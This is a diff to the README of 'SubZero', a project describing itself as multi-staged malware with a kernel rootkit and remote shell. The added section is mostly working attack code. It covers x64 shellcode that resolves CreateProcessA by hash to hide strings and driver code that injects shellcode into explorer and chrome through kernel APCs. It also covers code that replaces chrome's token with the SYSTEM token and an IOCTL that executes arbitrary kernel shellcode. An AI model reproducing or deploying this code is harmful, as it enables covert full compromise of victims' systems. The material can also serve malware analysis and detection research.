@@ -1,3 +1,4 @@
+
 # The SubZero Project  
 
 SubZero is a multi-staged malware that contains a kernel mode rootkit and a remote system shell. Part of the malware capabilities are remote kernel mode shellcode execution and reflective DLL loading, which should grant full control over a compromised system.  
@@ -77,21 +78,21 @@ The following diagram summarizes the complete attack flow:
 
 # Code Walkthrough  
 
-| Project                                   | Description 
-| ----------------------------------------- | ------------ 
-| DSEFix           							            |  [DSEFix](https://github.com/hfiref0x/DSEFix)'s source code
-| KernelPISCreator 							            | Sample driver for creating and testing position independent kernel shellcode.   
-| SubZeroDLL (eventlog_provider.dll)        | The library loaded into chrome.exe    
-| SubZeroDriver (NdisNet.sys)   			      | The rootkit driver itself.
-| SubZeroLoader (GoogleUpdateClient.exe)    | The driver loader, executes on system boot.
-| SubZeroServer    							            | Python HTTP server that provides a small command line interface for making actions to the client.
-| SubZeroReflectivleyLoadedDLL     		    	| Sample DLL that will be sent to the client from the remote server and pops a message box on load.      
-| SubZeroCleanup   							            | Static library responsible for removing the malware from the system. Can be called from the loader (in case of an error) or from the DLL (in case of a remote command from the server)
-| SubZeroUtils     							            |  Static library containing most of the utility classes used in the project    
+| Project                                       | Description 
+| --------------------------------------------- | ------------ 
+| DSEFix           			        |  [DSEFix](https://github.com/hfiref0x/DSEFix)'s source code
+| KernelPISCreator 			        | Sample driver for creating and testing position independent kernel shellcode.   
+| SubZeroDLL (eventlog_provider.dll)            | The library loaded into chrome.exe    
+| SubZeroDriver (NdisNet.sys)   	        | The rootkit driver itself.
+| SubZeroLoader (GoogleUpdateClient.exe)        | The driver loader, executes on system boot.
+| SubZeroServer    			        | Python HTTP server that provides a small command line interface for making actions to the client.
+| SubZeroReflectivleyLoadedDLL          	| Sample DLL that will be sent to the client from the remote server and pops a message box on load.      
+| SubZeroCleanup   			        | Static library responsible for removing the malware from the system. Can be called from the loader (in case of an error) or from the DLL (in case of a remote command from the server)
+| SubZeroUtils     			        |  Static library containing most of the utility classes used in the project    
 
 ## Driver 
 
-Starting from the `DriverEntry` function, the driver initializes the usual structurtes (`DeviceObject`, symbolic link etc..) and register its callback and dispatch functions. This is followed by the seeking of explorer's PID, which should be present in the system's process list (`FindProcessByName` simply traverse the system's `EPROCESS` list and compare each entry's name to the inputed one). In case it doesn't, the thread sleeps for 5 seconds and tries again:
+Starting from the `DriverEntry` function, the driver initializes the usual structures (`DeviceObject`, symbolic link etc..) and register its callback and dispatch functions. This is followed by the seeking of explorer's PID, which should be present in the system's process list (`FindProcessByName` simply traverse the system's `EPROCESS` list and compare each entry's name to the inputed one). In case it doesn't, the thread sleeps for 5 seconds and tries again:
 ```cpp
 // Search for explorer Process
 PEPROCESS explorerProcess;
@@ -109,7 +110,7 @@ do {
 } while (true);
 ...
 ```
- Next, an explorer thread should be catched. Using the `OnThreadNotify` callback function the driver checks whether the newley created thread is explorer's. Once found, the driver registers the function `OnProcessNotify` for process creation events and the function `InjectUsermodeShellcodeAPC` is then queued to that thread's APC queue, with a chrome-launching shellcode as its parameter:
+ Next, an explorer thread should be caught. Using the `OnThreadNotify` callback function the driver checks whether the newly created thread is explorer's. Once found, the driver registers the function `OnProcessNotify` for process creation events and the function `InjectUsermodeShellcodeAPC` is then queued to that thread's APC queue, with a chrome-launching shellcode as its parameter:
 ```cpp
 // Search for an explorer Thread
 if (pid == g_Globals.ExplorerPID) 
@@ -125,7 +126,7 @@ if (pid == g_Globals.ExplorerPID)
 	const auto status = ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
 
 	if (!NT_SUCCESS(status)) {
-	KdPrint((DRIVER_PREFIX "[-] Failed to register Process callback (status=0x%08X)\n", 		status));
+	KdPrint((DRIVER_PREFIX "[-] Failed to register Process callback (status=0x%08X)\n", status));
 	return;
 	}
 	
@@ -219,11 +220,11 @@ initially, the space is allocated with `PAGE_EXECUTE_READ`, then an [`MDL`](http
 	__try
 	{
 		::RtlCopyMemory(mappedAddress, Shellcode, ShellcodeSize);
-		KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, 				(int)ShellcodeSize));
+		KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, (int)ShellcodeSize));
 	}
 	__except (EXCEPTION_EXECUTE_HANDLER)
 	{
-		KdPrint((DRIVER_PREFIX "[-] Error copying Shellcode to mapped address - (0x%p)\n", 	mappedAddress));
+		KdPrint((DRIVER_PREFIX "[-] Error copying Shellcode to mapped address - (0x%p)\n", mappedAddress));
 	}
 
 	// Free MDL pages
@@ -236,6 +237,190 @@ initially, the space is allocated with `PAGE_EXECUTE_READ`, then an [`MDL`](http
 	// Kernel APC finished - release RP
 	::ExReleaseRundownProtection(&g_Globals.RundownProtection);
 }
+```
+---
+### The Shellcodes
+Before catching the launched chrome process, let's see how the shellcode works and launches the process in the first place.
+The shellcode was written with the help of [this](https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/) Nytro Security tutorial, that covers the basics of x64 assembly and how to find the addresses of API functions at runtime.
+In short, the shellcode starts with the parsing of the process' `PEB` (retrieved via the `GS` register) and finding the base address of `kernel32.dll` from the structure's lists:
+```assembly
+; Parse PEB and find kernel32
+
+xor rcx, rcx 			; RCX = 0 
+mov rax, [gs:rcx + 0x60] 	; RAX = PEB
+mov rax, [rax + 0x18] 		; RAX = PEB->Ldr 
+mov rsi, [rax + 0x20] 		; RSI = PEB->Ldr.InMemOrder
+lodsq 				; RAX = Second module 
+xchg rax, rsi 			; RAX = RSI, RSI = RAX 
+lodsq 				; RAX = Third(kernel32) 
+mov rbx, [rax + 0x20] 		; RBX = Base address
+```
+After parsing kernel32.dll and getting the address of its export table, the shellcode traverses through it and sends each function name to a [`djb2`](https://theartincode.stanis.me/008-djb2/) hash function. The returned hash is then compared to the fixed hash of `CreateProcessA` - this way, the shellcode avoid using exposing strings:
+```assembly
+; Loop through exported functions and find CreateProcessA
+
+mov r9d, 0xaeb52e19 		; djb2(CreateProcessA)
+inc rcx 			; Increment the ordinal
+xor rax, rax 			; RAX = 0
+mov eax, [rsi + rcx * 4]	; Get name offset
+add rax, rbx 			; Get function name
+push rcx 			; Push ordinal
+mov rcx, rax 			; RCX = Function name pointer
+mov rdx, 1 			; RDX = Char size (ASCII)
+call djb2 			; Hash name
+pop rcx 			; Pop ordinal back
+cmp eax, r9d 			; CreateProcessA?
+jnz Get_Function
+xor rsi, rsi 			; RSI = 0
+mov esi, [r8 + 0x24] 		; ESI = Offset ordinals
+add rsi, rbx 			; RSI = Ordinals table
+mov cx, [rsi + rcx * 2] 	; Number of function
+xor rsi, rsi 			; RSI = 0
+mov esi, [r8 + 0x1c] 		; Offset address table
+add rsi, rbx 			; ESI = Address table
+xor rdx, rdx 			; RDX = 0
+mov edx, [rsi + rcx * 4] 	; EDX = Pointer(offset)
+add rdx, rbx 			; RDX = CreateProcessA
+mov rdi, rdx 			; Save CreateProcessA in RDI
+```
+After `CreateProcessA`'s address is found it gets called with chrome.exe's path - this path does reisde in memory because `djb2` does not have a decoding function (It is possible to hide this text aswell, I chose not to):
+```assembly
+; Push the rest of CreateProcessA's parameters and call it
+
+push r11 				; lpProcessInformation
+push r10 				; lpStartupInfo
+push rdx 				; bInheritHandles
+push rdx				; dwCreationFlags
+push rdx 				; lpEnvironment
+push rdx 				; lpCurrentDirectory
+xor r9, r9 				; lpThreadAttributes
+xor r8, r8 				; lpProcessAttributes
+lea rcx, [r15  + cmdline - get_rip]	; lpApplicationName
+sub rsp, 0x20 				; Allocate stack space
+call rdi 				; CreateProcessA();
+add rsp, 0xD0 				; Free stack space: 0x20 (shadow space) + 0x30 (paramateres pushed) + 0x80 (structures)
+```
+The  shellcode that loads the DLL to the chorme process works similarly to this one except calling `LoadLibrary` instead of `CreateProcessA`.
+
+---
+Back to the driver - the shellcode executes by an explorer thread and a chrome process should be opened. In the process creation callback function the driver checks whether a new process with explorer's PID has created:
+```cpp
+void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
+{
+	// Process creation only
+	if (!CreateInfo) 
+		return;
+
+	auto pid = ::HandleToULong(ProcessId);
+	if (g_Globals.ChromePID == 0) 
+	{
+		// Search for our ghost chrome
+		if (::HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) 
+		{
+			KdPrint((DRIVER_PREFIX "[+] Chrome.exe catched. PID: %d\n", pid));
+			g_Globals.ChromePID = pid;
+		}
+	}
+}
+```
+The PID of that process is saved, and its first thread is then caught by the thread notification function. Once again, a kernel APC is queued for that thread and prior to injecting the library-loading shellcode into it, it sets the process' token to the system's one and unregister the thread and process notification callbacks:
+
+```cpp
+	// Search for chrome's first Thread
+	else if (pid == g_Globals.ChromePID)
+	{
+		// Check if the first Thread was already found
+		if (g_Globals.ChromeFirstThreadID != 0) 
+			return;
+		
+		KdPrint((DRIVER_PREFIX "[+] Chrome first Thread catched. TID: %d\n", tid));
+		g_Globals.ChromeFirstThreadID = tid;
+	
+		// Queue APC for dll loading
+		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) 
+		{
+			::PsLookupThreadByThreadId(ThreadId, &thread);
+			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)
+			{
+				auto* const process = ::PsGetCurrentProcess(); 		// Get current process (i.e. chrome.exe)
+				auto* const token = ::PsReferencePrimaryToken(process); // Get the process token
+				SetTokenToSystem(process, token); 			// Replace the process token with system token
+				::ObDereferenceObject(token); 				// Dereference the process token
+			
+				// Thread and Process creation notification callbacks are not needed anymore
+				::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
+				::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
+			
+				// Now inject the shellcode
+				InjectUsermodeShellcodeAPC(LoadLibraryShellcode, ARRAYSIZE(LoadLibraryShellcode)); 	
+			})))
+				::ExReleaseRundownProtection(&g_Globals.RundownProtection);
+			}
+		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
+	}
+```
+Let's take a look on the driver's IOCTLs. As stated, two of them provide a user-mode client the ability to change any process' token and parent PID. These function are relatively simple - get the pointer of a process `EPROCESS` structure by its PID and change the value located at a fixed position from that pointer. 
+The IOCTL that executes a position independet shellcode is the one that really interests us. Writing a kernel mode shellcode is a different story than a user mode one - it's harder to debug and since the kernel modules base addresses cannot be retrieved from the `PEB`, getting the addresses of kernel functions is way more difficult.
+To make my life easier, I used [@avivshabtay](https://github.com/AvivShabtay)'s template for creating a [position independent shellcode (PIS)](https://github.com/AvivShabtay/OffensiveWinAPI/tree/master/PIC). The main idea goes like this:
+1. Write a function that recieves either the addresses of `GetProcAddress` and `LoadLibrary` (user mode) or `MmGetSystemRoutineAddress` (kernel mode).
+2. Use the recieved addresses to get the addresses of the rest of the API functions you desire.
+3. Disable all compiler code enhancement and security features (either from the project's properties or disable before the function's implementation) in order to make the assembly code as pure as possible.
+4. Write an injector that will allocate and copy the function, then call it in a new thread with the respective addresses as parameter.
+
+The IOCTL handler recieves a kernel PIS in its input buffer and copies it to a new kernel allocation. In case the shellcode would need to return data, another memory space is allocated in a size also recieved by the client.
+The handler then builds a `PisParameters` structure with the addresses of `MmGetSystemRoutineAddress` and the returned data allocation, and starts a new kernel thread that will execute the PIS with the address of the structure as its parameter:
+```cpp
+	auto* buffer = static_cast<SubZeroExecuteShellcodeData*>(Irp->AssociatedIrp.SystemBuffer);
+	if (sizeof(SubZeroExecuteShellcodeData) + buffer->ShellcodeSize > StackLocation->Parameters.DeviceIoControl.InputBufferLength)
+		return STATUS_BUFFER_TOO_SMALL;
+
+	auto* const returnedDataAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ReturnedDataMaxSize, DRIVER_TAG);
+	if (nullptr == returnedDataAddress) {
+		KdPrint((DRIVER_PREFIX "[-] Error allocating returned data space\n"));
+		return STATUS_INSUFFICIENT_RESOURCES;
+	}
+
+	PicParameters picParameters
+	{
+	MmGetSystemRoutineAddress,
+	returnedDataAddress,
+	buffer->ReturnedDataMaxSize
+	};
+
+	auto* const picAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ShellcodeSize, DRIVER_TAG);
+	if (nullptr == picAddress) {
+		KdPrint((DRIVER_PREFIX "[-] Error allocating PIC space\n"));
+		return STATUS_INSUFFICIENT_RESOURCES;
+	}
+
+	::RtlCopyMemory(picAddress, reinterpret_cast<PCHAR>(buffer) + buffer->ShellcodeOffset, buffer->ShellcodeSize);
+	auto const pic = static_cast<PicFunction>(picAddress);
+
+	HANDLE threadHandle;
+	auto status = ::PsCreateSystemThread(&threadHandle, THREAD_ALL_ACCESS, nullptr, nullptr, nullptr, pic, &picParameters);
+	if (!NT_SUCCESS(status))
+		return status;
+
+	PVOID threadObject;
+	status = ::ObReferenceObjectByHandle(threadHandle, THREAD_ALL_ACCESS, nullptr, KernelMode, &threadObject, nullptr);
+	if (!NT_SUCCESS(status))
+		return status;
+		
+	status = ::KeWaitForSingleObject(threadObject, Executive, KernelMode, FALSE, nullptr);
+	if (!NT_SUCCESS(status))
+		return status;
+
+	// Copy returned data to user buffer
+	::RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, picParameters.ReturnedDataAddress, buffer->ReturnedDataMaxSize);
+
+	// Set returned data buffer size
+	Irp->IoStatus.Information = picParameters.ReturnedDataMaxSize;
+
+	// Free PIC memory
+	::ExFreePoolWithTag(returnedDataAddress, DRIVER_TAG);
+	::ExFreePoolWithTag(picAddress, DRIVER_TAG);
+
+	return STATUS_SUCCESS;
 ```
 ## DLL  
   
